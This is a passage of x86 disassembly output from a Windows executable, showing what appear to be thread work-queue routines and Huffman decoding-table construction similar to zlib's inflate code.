  40789b:	56                   	push   %esi
  40789c:	6a ff                	push   $0xffffffff
  40789e:	ff 75 08             	push   0x8(%ebp)
  4078a1:	ff 15 6c 90 40 00    	call   *0x40906c
  4078a7:	ff 75 08             	push   0x8(%ebp)
  4078aa:	8b f0                	mov    %eax,%esi
  4078ac:	ff 15 1c 91 40 00    	call   *0x40911c
  4078b2:	85 f6                	test   %esi,%esi
  4078b4:	5e                   	pop    %esi
  4078b5:	74 07                	je     0x4078be
  4078b7:	5d                   	pop    %ebp
  4078b8:	ff 25 ec 90 40 00    	jmp    *0x4090ec
  4078be:	8b 45 14             	mov    0x14(%ebp),%eax
  4078c1:	85 c0                	test   %eax,%eax
  4078c3:	74 05                	je     0x4078ca
  4078c5:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4078c8:	89 08                	mov    %ecx,(%eax)
  4078ca:	33 c0                	xor    %eax,%eax
  4078cc:	5d                   	pop    %ebp
  4078cd:	c3                   	ret
  4078ce:	51                   	push   %ecx
  4078cf:	51                   	push   %ecx
  4078d0:	56                   	push   %esi
  4078d1:	8b 74 24 10          	mov    0x10(%esp),%esi
  4078d5:	85 f6                	test   %esi,%esi
  4078d7:	75 07                	jne    0x4078e0
  4078d9:	33 c0                	xor    %eax,%eax
  4078db:	e9 9a 00 00 00       	jmp    0x40797a
  4078e0:	53                   	push   %ebx
  4078e1:	55                   	push   %ebp
  4078e2:	57                   	push   %edi
  4078e3:	8b 3d 74 91 40 00    	mov    0x409174,%edi
  4078e9:	8d 6e 24             	lea    0x24(%esi),%ebp
  4078ec:	55                   	push   %ebp
  4078ed:	ff 15 78 91 40 00    	call   *0x409178
  4078f3:	83 7e 20 00          	cmpl   $0x0,0x20(%esi)
  4078f7:	75 08                	jne    0x407901
  4078f9:	8b 46 1c             	mov    0x1c(%esi),%eax
  4078fc:	3b 46 08             	cmp    0x8(%esi),%eax
  4078ff:	72 17                	jb     0x407918
  407901:	83 be 84 00 00 00 00 	cmpl   $0x0,0x84(%esi)
  407908:	55                   	push   %ebp
  407909:	75 68                	jne    0x407973
  40790b:	8d 46 60             	lea    0x60(%esi),%eax
  40790e:	50                   	push   %eax
  40790f:	e8 24 fe ff ff       	call   0x407738
  407914:	59                   	pop    %ecx
  407915:	59                   	pop    %ecx
  407916:	eb db                	jmp    0x4078f3
  407918:	8b 46 10             	mov    0x10(%esi),%eax
  40791b:	8b 4e 0c             	mov    0xc(%esi),%ecx
  40791e:	8b 14 c1             	mov    (%ecx,%eax,8),%edx
  407921:	8b 4c c1 04          	mov    0x4(%ecx,%eax,8),%ecx
  407925:	40                   	inc    %eax
  407926:	89 54 24 10          	mov    %edx,0x10(%esp)
  40792a:	33 d2                	xor    %edx,%edx
  40792c:	f7 76 18             	divl   0x18(%esi)
  40792f:	ff 46 1c             	incl   0x1c(%esi)
  407932:	33 c0                	xor    %eax,%eax
  407934:	8d 5e 3c             	lea    0x3c(%esi),%ebx
  407937:	53                   	push   %ebx
  407938:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  40793c:	3b 56 14             	cmp    0x14(%esi),%edx
  40793f:	89 56 10             	mov    %edx,0x10(%esi)
  407942:	0f 94 c0             	sete   %al
  407945:	89 46 20             	mov    %eax,0x20(%esi)
  407948:	e8 84 fe ff ff       	call   0x4077d1
  40794d:	59                   	pop    %ecx
  40794e:	55                   	push   %ebp
  40794f:	ff d7                	call   *%edi
  407951:	ff 74 24 14          	push   0x14(%esp)
  407955:	ff 54 24 14          	call   *0x14(%esp)
  407959:	59                   	pop    %ecx
  40795a:	55                   	push   %ebp
  40795b:	ff 15 78 91 40 00    	call   *0x409178
  407961:	ff 4e 1c             	decl   0x1c(%esi)
  407964:	53                   	push   %ebx
  407965:	e8 67 fe ff ff       	call   0x4077d1
  40796a:	59                   	pop    %ecx
  40796b:	55                   	push   %ebp
  40796c:	ff d7                	call   *%edi
  40796e:	e9 79 ff ff ff       	jmp    0x4078ec
  407973:	ff d7                	call   *%edi
  407975:	5f                   	pop    %edi
  407976:	5d                   	pop    %ebp
  407977:	8b c6                	mov    %esi,%eax
  407979:	5b                   	pop    %ebx
  40797a:	5e                   	pop    %esi
  40797b:	59                   	pop    %ecx
  40797c:	59                   	pop    %ecx
  40797d:	c3                   	ret
  40797e:	55                   	push   %ebp
  40797f:	8b ec                	mov    %esp,%ebp
  407981:	51                   	push   %ecx
  407982:	53                   	push   %ebx
  407983:	33 db                	xor    %ebx,%ebx
  407985:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  407988:	75 07                	jne    0x407991
  40798a:	33 c0                	xor    %eax,%eax
  40798c:	e9 cf 00 00 00       	jmp    0x407a60
  407991:	56                   	push   %esi
  407992:	57                   	push   %edi
  407993:	8b 3d 2c 91 40 00    	mov    0x40912c,%edi
  407999:	68 88 00 00 00       	push   $0x88
  40799e:	6a 40                	push   $0x40
  4079a0:	ff d7                	call   *%edi
  4079a2:	8b f0                	mov    %eax,%esi
  4079a4:	3b f3                	cmp    %ebx,%esi
  4079a6:	0f 84 b0 00 00 00    	je     0x407a5c
  4079ac:	8b 45 0c             	mov    0xc(%ebp),%eax
  4079af:	40                   	inc    %eax
  4079b0:	89 46 18             	mov    %eax,0x18(%esi)
  4079b3:	c1 e0 03             	shl    $0x3,%eax
  4079b6:	50                   	push   %eax
  4079b7:	6a 40                	push   $0x40
  4079b9:	ff d7                	call   *%edi
  4079bb:	89 46 0c             	mov    %eax,0xc(%esi)
  4079be:	8d 46 24             	lea    0x24(%esi),%eax
  4079c1:	50                   	push   %eax
  4079c2:	89 5e 10             	mov    %ebx,0x10(%esi)
  4079c5:	89 5e 14             	mov    %ebx,0x14(%esi)
  4079c8:	89 5e 1c             	mov    %ebx,0x1c(%esi)
  4079cb:	c7 46 20 01 00 00 00 	movl   $0x1,0x20(%esi)
  4079d2:	ff 15 6c 91 40 00    	call   *0x40916c
  4079d8:	8d 46 3c             	lea    0x3c(%esi),%eax
  4079db:	50                   	push   %eax
  4079dc:	e8 db fc ff ff       	call   0x4076bc
  4079e1:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4079e4:	8d 46 60             	lea    0x60(%esi),%eax
  4079e7:	50                   	push   %eax
  4079e8:	e8 cf fc ff ff       	call   0x4076bc
  4079ed:	0b 45 fc             	or     -0x4(%ebp),%eax
  4079f0:	59                   	pop    %ecx
  4079f1:	59                   	pop    %ecx
  4079f2:	75 61                	jne    0x407a55
  4079f4:	8b 45 08             	mov    0x8(%ebp),%eax
  4079f7:	6b c0 0c             	imul   $0xc,%eax,%eax
  4079fa:	50                   	push   %eax
  4079fb:	6a 40                	push   $0x40
  4079fd:	89 9e 84 00 00 00    	mov    %ebx,0x84(%esi)
  407a03:	ff d7                	call   *%edi
  407a05:	3b c3                	cmp    %ebx,%eax
  407a07:	89 06                	mov    %eax,(%esi)
  407a09:	89 5e 04             	mov    %ebx,0x4(%esi)
  407a0c:	74 47                	je     0x407a55
  407a0e:	39 5e 0c             	cmp    %ebx,0xc(%esi)
  407a11:	74 42                	je     0x407a55
  407a13:	8b 7d 08             	mov    0x8(%ebp),%edi
  407a16:	3b fb                	cmp    %ebx,%edi
  407a18:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  407a1b:	76 28                	jbe    0x407a45
  407a1d:	89 5d 08             	mov    %ebx,0x8(%ebp)
  407a20:	8b 06                	mov    (%esi),%eax
  407a22:	03 45 08             	add    0x8(%ebp),%eax
  407a25:	56                   	push   %esi
  407a26:	68 ce 78 40 00       	push   $0x4078ce
  407a2b:	53                   	push   %ebx
  407a2c:	50                   	push   %eax
  407a2d:	e8 25 fe ff ff       	call   0x407857
  407a32:	83 c4 10             	add    $0x10,%esp
  407a35:	85 c0                	test   %eax,%eax
  407a37:	75 16                	jne    0x407a4f
  407a39:	ff 45 fc             	incl   -0x4(%ebp)
  407a3c:	83 45 08 0c          	addl   $0xc,0x8(%ebp)
  407a40:	39 7d fc             	cmp    %edi,-0x4(%ebp)
  407a43:	72 db                	jb     0x407a20
  407a45:	89 7e 04             	mov    %edi,0x4(%esi)
  407a48:	89 7e 08             	mov    %edi,0x8(%esi)
  407a4b:	8b c6                	mov    %esi,%eax
  407a4d:	eb 0f                	jmp    0x407a5e
  407a4f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407a52:	89 46 04             	mov    %eax,0x4(%esi)
  407a55:	56                   	push   %esi
  407a56:	ff 15 30 91 40 00    	call   *0x409130
  407a5c:	33 c0                	xor    %eax,%eax
  407a5e:	5f                   	pop    %edi
  407a5f:	5e                   	pop    %esi
  407a60:	5b                   	pop    %ebx
  407a61:	c9                   	leave
  407a62:	c3                   	ret
  407a63:	6a 00                	push   $0x0
  407a65:	ff 74 24 08          	push   0x8(%esp)
  407a69:	e8 10 ff ff ff       	call   0x40797e
  407a6e:	59                   	pop    %ecx
  407a6f:	59                   	pop    %ecx
  407a70:	c3                   	ret
  407a71:	51                   	push   %ecx
  407a72:	55                   	push   %ebp
  407a73:	33 ed                	xor    %ebp,%ebp
  407a75:	3b dd                	cmp    %ebp,%ebx
  407a77:	56                   	push   %esi
  407a78:	57                   	push   %edi
  407a79:	74 5b                	je     0x407ad6
  407a7b:	8d 73 24             	lea    0x24(%ebx),%esi
  407a7e:	56                   	push   %esi
  407a7f:	ff 15 78 91 40 00    	call   *0x409178
  407a85:	56                   	push   %esi
  407a86:	c7 83 84 00 00 00 01 	movl   $0x1,0x84(%ebx)
  407a8d:	00 00 00 
  407a90:	ff 15 74 91 40 00    	call   *0x409174
  407a96:	8d 43 3c             	lea    0x3c(%ebx),%eax
  407a99:	50                   	push   %eax
  407a9a:	e8 6a fd ff ff       	call   0x407809
  407a9f:	8d 43 60             	lea    0x60(%ebx),%eax
  407aa2:	50                   	push   %eax
  407aa3:	e8 61 fd ff ff       	call   0x407809
  407aa8:	39 6b 04             	cmp    %ebp,0x4(%ebx)
  407aab:	59                   	pop    %ecx
  407aac:	59                   	pop    %ecx
  407aad:	76 27                	jbe    0x407ad6
  407aaf:	89 6c 24 0c          	mov    %ebp,0xc(%esp)
  407ab3:	8b 33                	mov    (%ebx),%esi
  407ab5:	03 74 24 0c          	add    0xc(%esp),%esi
  407ab9:	6a 00                	push   $0x0
  407abb:	83 ec 0c             	sub    $0xc,%esp
  407abe:	8b fc                	mov    %esp,%edi
  407ac0:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407ac1:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407ac2:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407ac3:	e8 ca fd ff ff       	call   0x407892
  407ac8:	83 44 24 1c 0c       	addl   $0xc,0x1c(%esp)
  407acd:	83 c4 10             	add    $0x10,%esp
  407ad0:	45                   	inc    %ebp
  407ad1:	3b 6b 04             	cmp    0x4(%ebx),%ebp
  407ad4:	72 dd                	jb     0x407ab3
  407ad6:	5f                   	pop    %edi
  407ad7:	5e                   	pop    %esi
  407ad8:	5d                   	pop    %ebp
  407ad9:	59                   	pop    %ecx
  407ada:	c3                   	ret
  407adb:	53                   	push   %ebx
  407adc:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  407ae0:	85 db                	test   %ebx,%ebx
  407ae2:	74 37                	je     0x407b1b
  407ae4:	56                   	push   %esi
  407ae5:	e8 87 ff ff ff       	call   0x407a71
  407aea:	8d 43 24             	lea    0x24(%ebx),%eax
  407aed:	50                   	push   %eax
  407aee:	ff 15 70 91 40 00    	call   *0x409170
  407af4:	8d 43 3c             	lea    0x3c(%ebx),%eax
  407af7:	50                   	push   %eax
  407af8:	e8 0f fc ff ff       	call   0x40770c
  407afd:	8d 43 60             	lea    0x60(%ebx),%eax
  407b00:	50                   	push   %eax
  407b01:	e8 06 fc ff ff       	call   0x40770c
  407b06:	8b 35 30 91 40 00    	mov    0x409130,%esi
  407b0c:	59                   	pop    %ecx
  407b0d:	59                   	pop    %ecx
  407b0e:	ff 73 0c             	push   0xc(%ebx)
  407b11:	ff d6                	call   *%esi
  407b13:	ff 33                	push   (%ebx)
  407b15:	ff d6                	call   *%esi
  407b17:	53                   	push   %ebx
  407b18:	ff d6                	call   *%esi
  407b1a:	5e                   	pop    %esi
  407b1b:	5b                   	pop    %ebx
  407b1c:	c3                   	ret
  407b1d:	56                   	push   %esi
  407b1e:	8b 71 18             	mov    0x18(%ecx),%esi
  407b21:	83 fe 01             	cmp    $0x1,%esi
  407b24:	76 12                	jbe    0x407b38
  407b26:	8b 41 14             	mov    0x14(%ecx),%eax
  407b29:	40                   	inc    %eax
  407b2a:	33 d2                	xor    %edx,%edx
  407b2c:	f7 f6                	div    %esi
  407b2e:	33 c0                	xor    %eax,%eax
  407b30:	5e                   	pop    %esi
  407b31:	39 51 10             	cmp    %edx,0x10(%ecx)
  407b34:	0f 94 c0             	sete   %al
  407b37:	c3                   	ret
  407b38:	8b 41 1c             	mov    0x1c(%ecx),%eax
  407b3b:	3b 41 08             	cmp    0x8(%ecx),%eax
  407b3e:	74 07                	je     0x407b47
  407b40:	33 c0                	xor    %eax,%eax
  407b42:	39 41 20             	cmp    %eax,0x20(%ecx)
  407b45:	75 03                	jne    0x407b4a
  407b47:	33 c0                	xor    %eax,%eax
  407b49:	40                   	inc    %eax
  407b4a:	5e                   	pop    %esi
  407b4b:	c3                   	ret
  407b4c:	85 c9                	test   %ecx,%ecx
  407b4e:	74 3a                	je     0x407b8a
  407b50:	83 b9 84 00 00 00 00 	cmpl   $0x0,0x84(%ecx)
  407b57:	75 31                	jne    0x407b8a
  407b59:	8b 51 14             	mov    0x14(%ecx),%edx
  407b5c:	8b 41 0c             	mov    0xc(%ecx),%eax
  407b5f:	83 61 20 00          	andl   $0x0,0x20(%ecx)
  407b63:	56                   	push   %esi
  407b64:	8b 74 24 08          	mov    0x8(%esp),%esi
  407b68:	89 34 d0             	mov    %esi,(%eax,%edx,8)
  407b6b:	8b 74 24 0c          	mov    0xc(%esp),%esi
  407b6f:	89 74 d0 04          	mov    %esi,0x4(%eax,%edx,8)
  407b73:	8b 41 14             	mov    0x14(%ecx),%eax
  407b76:	40                   	inc    %eax
  407b77:	33 d2                	xor    %edx,%edx
  407b79:	f7 71 18             	divl   0x18(%ecx)
  407b7c:	83 c1 60             	add    $0x60,%ecx
  407b7f:	51                   	push   %ecx
  407b80:	89 51 b4             	mov    %edx,-0x4c(%ecx)
  407b83:	e8 49 fc ff ff       	call   0x4077d1
  407b88:	59                   	pop    %ecx
  407b89:	5e                   	pop    %esi
  407b8a:	c3                   	ret
  407b8b:	56                   	push   %esi
  407b8c:	8b 74 24 08          	mov    0x8(%esp),%esi
  407b90:	85 f6                	test   %esi,%esi
  407b92:	74 46                	je     0x407bda
  407b94:	57                   	push   %edi
  407b95:	8d 7e 24             	lea    0x24(%esi),%edi
  407b98:	57                   	push   %edi
  407b99:	ff 15 78 91 40 00    	call   *0x409178
  407b9f:	eb 15                	jmp    0x407bb6
  407ba1:	83 be 84 00 00 00 00 	cmpl   $0x0,0x84(%esi)
  407ba8:	75 17                	jne    0x407bc1
  407baa:	8d 46 3c             	lea    0x3c(%esi),%eax
  407bad:	57                   	push   %edi
  407bae:	50                   	push   %eax
  407baf:	e8 84 fb ff ff       	call   0x407738
  407bb4:	59                   	pop    %ecx
  407bb5:	59                   	pop    %ecx
  407bb6:	8b ce                	mov    %esi,%ecx
  407bb8:	e8 60 ff ff ff       	call   0x407b1d
  407bbd:	85 c0                	test   %eax,%eax
  407bbf:	75 e0                	jne    0x407ba1
  407bc1:	ff 74 24 14          	push   0x14(%esp)
  407bc5:	8b ce                	mov    %esi,%ecx
  407bc7:	ff 74 24 14          	push   0x14(%esp)
  407bcb:	e8 7c ff ff ff       	call   0x407b4c
  407bd0:	59                   	pop    %ecx
  407bd1:	59                   	pop    %ecx
  407bd2:	57                   	push   %edi
  407bd3:	ff 15 74 91 40 00    	call   *0x409174
  407bd9:	5f                   	pop    %edi
  407bda:	5e                   	pop    %esi
  407bdb:	c3                   	ret
  407bdc:	53                   	push   %ebx
  407bdd:	57                   	push   %edi
  407bde:	8b be b4 9b 00 00    	mov    0x9bb4(%esi),%edi
  407be4:	8b 9e b8 9b 00 00    	mov    0x9bb8(%esi),%ebx
  407bea:	3b fb                	cmp    %ebx,%edi
  407bec:	76 06                	jbe    0x407bf4
  407bee:	8b 9e b0 9b 00 00    	mov    0x9bb0(%esi),%ebx
  407bf4:	8b 46 0c             	mov    0xc(%esi),%eax
  407bf7:	2b df                	sub    %edi,%ebx
  407bf9:	3b d8                	cmp    %eax,%ebx
  407bfb:	72 02                	jb     0x407bff
  407bfd:	8b d8                	mov    %eax,%ebx
  407bff:	53                   	push   %ebx
  407c00:	57                   	push   %edi
  407c01:	ff 76 08             	push   0x8(%esi)
  407c04:	2b c3                	sub    %ebx,%eax
  407c06:	89 46 0c             	mov    %eax,0xc(%esi)
  407c09:	e8 09 e5 ff ff       	call   0x406117
  407c0e:	01 5e 08             	add    %ebx,0x8(%esi)
  407c11:	8b 86 b0 9b 00 00    	mov    0x9bb0(%esi),%eax
  407c17:	03 fb                	add    %ebx,%edi
  407c19:	3b f8                	cmp    %eax,%edi
  407c1b:	75 16                	jne    0x407c33
  407c1d:	39 86 b8 9b 00 00    	cmp    %eax,0x9bb8(%esi)
  407c23:	8d be b0 1b 00 00    	lea    0x1bb0(%esi),%edi
  407c29:	75 b9                	jne    0x407be4
  407c2b:	89 be b8 9b 00 00    	mov    %edi,0x9bb8(%esi)
  407c31:	eb b1                	jmp    0x407be4
  407c33:	89 be b4 9b 00 00    	mov    %edi,0x9bb4(%esi)
  407c39:	5f                   	pop    %edi
  407c3a:	5b                   	pop    %ebx
  407c3b:	c3                   	ret
  407c3c:	55                   	push   %ebp
  407c3d:	8d 6c 24 a8          	lea    -0x58(%esp),%ebp
  407c41:	81 ec 70 05 00 00    	sub    $0x570,%esp
  407c47:	56                   	push   %esi
  407c48:	57                   	push   %edi
  407c49:	6a 10                	push   $0x10
  407c4b:	8b f0                	mov    %eax,%esi
  407c4d:	59                   	pop    %ecx
  407c4e:	33 c0                	xor    %eax,%eax
  407c50:	8d 7d e4             	lea    -0x1c(%ebp),%edi
  407c53:	f3 ab                	rep stos %eax,%es:(%edi)
  407c55:	8b 7d 64             	mov    0x64(%ebp),%edi
  407c58:	8b 4d 60             	mov    0x60(%ebp),%ecx
  407c5b:	8b d7                	mov    %edi,%edx
  407c5d:	8b 01                	mov    (%ecx),%eax
  407c5f:	8d 44 85 e4          	lea    -0x1c(%ebp,%eax,4),%eax
  407c63:	ff 00                	incl   (%eax)
  407c65:	83 c1 04             	add    $0x4,%ecx
  407c68:	4a                   	dec    %edx
  407c69:	75 f2                	jne    0x407c5d
  407c6b:	39 7d e4             	cmp    %edi,-0x1c(%ebp)
  407c6e:	75 10                	jne    0x407c80
  407c70:	8b 45 74             	mov    0x74(%ebp),%eax
  407c73:	83 20 00             	andl   $0x0,(%eax)
  407c76:	83 26 00             	andl   $0x0,(%esi)
  407c79:	33 c0                	xor    %eax,%eax
  407c7b:	e9 da 02 00 00       	jmp    0x407f5a
  407c80:	8b 06                	mov    (%esi),%eax
  407c82:	6a 0f                	push   $0xf
  407c84:	33 ff                	xor    %edi,%edi
  407c86:	47                   	inc    %edi
  407c87:	5a                   	pop    %edx
  407c88:	89 45 54             	mov    %eax,0x54(%ebp)
  407c8b:	8b cf                	mov    %edi,%ecx
  407c8d:	53                   	push   %ebx
  407c8e:	33 db                	xor    %ebx,%ebx
  407c90:	39 5c 8d e4          	cmp    %ebx,-0x1c(%ebp,%ecx,4)
  407c94:	75 05                	jne    0x407c9b
  407c96:	41                   	inc    %ecx
  407c97:	3b ca                	cmp    %edx,%ecx
  407c99:	76 f3                	jbe    0x407c8e
  407c9b:	3b c1                	cmp    %ecx,%eax
  407c9d:	89 4d 50             	mov    %ecx,0x50(%ebp)
  407ca0:	73 03                	jae    0x407ca5
  407ca2:	89 4d 54             	mov    %ecx,0x54(%ebp)
  407ca5:	39 5c 95 e4          	cmp    %ebx,-0x1c(%ebp,%edx,4)
  407ca9:	75 03                	jne    0x407cae
  407cab:	4a                   	dec    %edx
  407cac:	75 f7                	jne    0x407ca5
  407cae:	39 55 54             	cmp    %edx,0x54(%ebp)
  407cb1:	89 55 3c             	mov    %edx,0x3c(%ebp)
  407cb4:	76 03                	jbe    0x407cb9
  407cb6:	89 55 54             	mov    %edx,0x54(%ebp)
  407cb9:	8b 45 54             	mov    0x54(%ebp),%eax
  407cbc:	89 06                	mov    %eax,(%esi)
  407cbe:	d3 e7                	shl    %cl,%edi
  407cc0:	eb 0d                	jmp    0x407ccf
  407cc2:	2b 7c 8d e4          	sub    -0x1c(%ebp,%ecx,4),%edi
  407cc6:	0f 88 97 02 00 00    	js     0x407f63
  407ccc:	41                   	inc    %ecx
  407ccd:	03 ff                	add    %edi,%edi
  407ccf:	3b ca                	cmp    %edx,%ecx
  407cd1:	72 ef                	jb     0x407cc2
  407cd3:	8b ca                	mov    %edx,%ecx
  407cd5:	c1 e1 02             	shl    $0x2,%ecx
  407cd8:	8d 44 0d e4          	lea    -0x1c(%ebp,%ecx,1),%eax
  407cdc:	8b 30                	mov    (%eax),%esi
  407cde:	2b fe                	sub    %esi,%edi
  407ce0:	89 7d 24             	mov    %edi,0x24(%ebp)
  407ce3:	0f 88 7a 02 00 00    	js     0x407f63
  407ce9:	03 f7                	add    %edi,%esi
  407ceb:	89 30                	mov    %esi,(%eax)
  407ced:	33 c0                	xor    %eax,%eax
  407cef:	4a                   	dec    %edx
  407cf0:	89 5d a8             	mov    %ebx,-0x58(%ebp)
  407cf3:	74 10                	je     0x407d05
  407cf5:	33 f6                	xor    %esi,%esi
  407cf7:	03 44 35 e8          	add    -0x18(%ebp,%esi,1),%eax
  407cfb:	83 c6 04             	add    $0x4,%esi
  407cfe:	4a                   	dec    %edx
  407cff:	89 44 35 a8          	mov    %eax,-0x58(%ebp,%esi,1)
  407d03:	75 f2                	jne    0x407cf7
  407d05:	8b 5d 60             	mov    0x60(%ebp),%ebx
  407d08:	33 f6                	xor    %esi,%esi
  407d0a:	8b 03                	mov    (%ebx),%eax
  407d0c:	83 c3 04             	add    $0x4,%ebx
  407d0f:	85 c0                	test   %eax,%eax
  407d11:	74 10                	je     0x407d23
  407d13:	8d 44 85 a4          	lea    -0x5c(%ebp,%eax,4),%eax
  407d17:	8b 10                	mov    (%eax),%edx
  407d19:	89 b4 95 e8 fa ff ff 	mov    %esi,-0x518(%ebp,%edx,4)
  407d20:	42                   	inc    %edx
  407d21:	89 10                	mov    %edx,(%eax)
  407d23:	46                   	inc    %esi
  407d24:	3b 75 64             	cmp    0x64(%ebp),%esi
  407d27:	72 e1                	jb     0x407d0a
  407d29:	8b 44 0d a4          	mov    -0x5c(%ebp,%ecx,1),%eax
  407d2d:	8b 4d 50             	mov    0x50(%ebp),%ecx
  407d30:	83 4d 48 ff          	orl    $0xffffffff,0x48(%ebp)
  407d34:	89 45 64             	mov    %eax,0x64(%ebp)
  407d37:	8d 85 e8 fa ff ff    	lea    -0x518(%ebp),%eax
  407d3d:	33 db                	xor    %ebx,%ebx
  407d3f:	89 45 34             	mov    %eax,0x34(%ebp)
  407d42:	8b 45 54             	mov    0x54(%ebp),%eax
  407d45:	f7 d8                	neg    %eax
  407d47:	3b 4d 3c             	cmp    0x3c(%ebp),%ecx
  407d4a:	89 5d 4c             	mov    %ebx,0x4c(%ebp)
  407d4d:	89 5d a4             	mov    %ebx,-0x5c(%ebp)
  407d50:	89 9d 68 ff ff ff    	mov    %ebx,-0x98(%ebp)
  407d56:	89 5d 30             	mov    %ebx,0x30(%ebp)
  407d59:	0f 8f ee 01 00 00    	jg     0x407f4d
  407d5f:	8d 51 ff             	lea    -0x1(%ecx),%edx
  407d62:	8d 4c 8d e4          	lea    -0x1c(%ebp,%ecx,4),%ecx
  407d66:	89 55 28             	mov    %edx,0x28(%ebp)
  407d69:	89 4d 38             	mov    %ecx,0x38(%ebp)
  407d6c:	8b 4d 38             	mov    0x38(%ebp),%ecx
  407d6f:	8b 31                	mov    (%ecx),%esi
  407d71:	85 f6                	test   %esi,%esi
  407d73:	0f 84 be 01 00 00    	je     0x407f37
  407d79:	eb 03                	jmp    0x407d7e
  407d7b:	8b 75 2c             	mov    0x2c(%ebp),%esi
  407d7e:	8b 4d 54             	mov    0x54(%ebp),%ecx
  407d81:	03 c8                	add    %eax,%ecx
  407d83:	4e                   	dec    %esi
  407d84:	39 4d 50             	cmp    %ecx,0x50(%ebp)
  407d87:	89 75 2c             	mov    %esi,0x2c(%ebp)
  407d8a:	89 4d 40             	mov    %ecx,0x40(%ebp)
  407d8d:	0f 8e cc 00 00 00    	jle    0x407e5f
  407d93:	46                   	inc    %esi
  407d94:	89 75 44             	mov    %esi,0x44(%ebp)
  407d97:	8b 75 3c             	mov    0x3c(%ebp),%esi
  407d9a:	2b 75 40             	sub    0x40(%ebp),%esi
  407d9d:	ff 45 48             	incl   0x48(%ebp)
  407da0:	3b 75 54             	cmp    0x54(%ebp),%esi
  407da3:	76 03                	jbe    0x407da8
  407da5:	8b 75 54             	mov    0x54(%ebp),%esi
  407da8:	8b 4d 50             	mov    0x50(%ebp),%ecx
  407dab:	2b 4d 40             	sub    0x40(%ebp),%ecx
  407dae:	33 d2                	xor    %edx,%edx
  407db0:	42                   	inc    %edx
  407db1:	d3 e2                	shl    %cl,%edx
  407db3:	3b 55 44             	cmp    0x44(%ebp),%edx
  407db6:	76 23                	jbe    0x407ddb
  407db8:	8b 5d 38             	mov    0x38(%ebp),%ebx
  407dbb:	83 cf ff             	or     $0xffffffff,%edi
  407dbe:	2b 7d 2c             	sub    0x2c(%ebp),%edi
  407dc1:	03 d7                	add    %edi,%edx
  407dc3:	3b ce                	cmp    %esi,%ecx
  407dc5:	73 14                	jae    0x407ddb
  407dc7:	eb 0d                	jmp    0x407dd6
  407dc9:	83 c3 04             	add    $0x4,%ebx
  407dcc:	8b 3b                	mov    (%ebx),%edi
  407dce:	03 d2                	add    %edx,%edx
  407dd0:	3b d7                	cmp    %edi,%edx
  407dd2:	76 07                	jbe    0x407ddb
  407dd4:	2b d7                	sub    %edi,%edx
  407dd6:	41                   	inc    %ecx
  407dd7:	3b ce                	cmp    %esi,%ecx
  407dd9:	72 ee                	jb     0x407dc9
  407ddb:	8b 55 7c             	mov    0x7c(%ebp),%edx
  407dde:	8b 12                	mov    (%edx),%edx
  407de0:	33 f6                	xor    %esi,%esi
  407de2:	46                   	inc    %esi
  407de3:	d3 e6                	shl    %cl,%esi
  407de5:	8d 3c 32             	lea    (%edx,%esi,1),%edi
  407de8:	81 ff a0 05 00 00    	cmp    $0x5a0,%edi
  407dee:	89 75 30             	mov    %esi,0x30(%ebp)
  407df1:	0f 87 6c 01 00 00    	ja     0x407f63
  407df7:	8b 75 78             	mov    0x78(%ebp),%esi
  407dfa:	8d 1c 96             	lea    (%esi,%edx,4),%ebx
  407dfd:	8b 55 7c             	mov    0x7c(%ebp),%edx
  407e00:	8b 75 48             	mov    0x48(%ebp),%esi
  407e03:	89 3a                	mov    %edi,(%edx)
  407e05:	8b 55 48             	mov    0x48(%ebp),%edx
  407e08:	85 d2                	test   %edx,%edx
  407e0a:	8d b4 b5 68 ff ff ff 	lea    -0x98(%ebp,%esi,4),%esi
  407e11:	89 1e                	mov    %ebx,(%esi)
  407e13:	74 2e                	je     0x407e43
  407e15:	8b 7d 4c             	mov    0x4c(%ebp),%edi
  407e18:	8b 76 fc             	mov    -0x4(%esi),%esi
  407e1b:	89 7c 95 a4          	mov    %edi,-0x5c(%ebp,%edx,4)
  407e1f:	8a 55 54             	mov    0x54(%ebp),%dl
  407e22:	88 55 61             	mov    %dl,0x61(%ebp)
  407e25:	88 4d 60             	mov    %cl,0x60(%ebp)
  407e28:	8b c8                	mov    %eax,%ecx
  407e2a:	8b d7                	mov    %edi,%edx
  407e2c:	d3 ea                	shr    %cl,%edx
  407e2e:	8b c3                	mov    %ebx,%eax
  407e30:	2b c6                	sub    %esi,%eax
  407e32:	c1 f8 02             	sar    $0x2,%eax
  407e35:	2b c2                	sub    %edx,%eax
  407e37:	66 89 45 62          	mov    %ax,0x62(%ebp)
  407e3b:	8b 45 60             	mov    0x60(%ebp),%eax
  407e3e:	89 04 96             	mov    %eax,(%esi,%edx,4)
  407e41:	eb 05                	jmp    0x407e48
  407e43:	8b 45 74             	mov    0x74(%ebp),%eax
  407e46:	89 18                	mov    %ebx,(%eax)
  407e48:	8b 4d 40             	mov    0x40(%ebp),%ecx
  407e4b:	8b c1                	mov    %ecx,%eax
  407e4d:	03 4d 54             	add    0x54(%ebp),%ecx
  407e50:	39 4d 50             	cmp    %ecx,0x50(%ebp)
  407e53:	89 4d 40             	mov    %ecx,0x40(%ebp)
  407e56:	0f 8f 3b ff ff ff    	jg     0x407d97
  407e5c:	8b 7d 24             	mov    0x24(%ebp),%edi
  407e5f:	8a 4d 50             	mov    0x50(%ebp),%cl
  407e62:	8b 75 34             	mov    0x34(%ebp),%esi
  407e65:	2a c8                	sub    %al,%cl
  407e67:	88 4d 61             	mov    %cl,0x61(%ebp)
  407e6a:	8b 4d 64             	mov    0x64(%ebp),%ecx
  407e6d:	8d 8c 8d e8 fa ff ff 	lea    -0x518(%ebp,%ecx,4),%ecx
  407e74:	3b f1                	cmp    %ecx,%esi
  407e76:	72 06                	jb     0x407e7e
  407e78:	c6 45 60 c0          	movb   $0xc0,0x60(%ebp)
  407e7c:	eb 46                	jmp    0x407ec4
  407e7e:	8b 0e                	mov    (%esi),%ecx
  407e80:	3b 4d 68             	cmp    0x68(%ebp),%ecx
  407e83:	73 1c                	jae    0x407ea1
  407e85:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
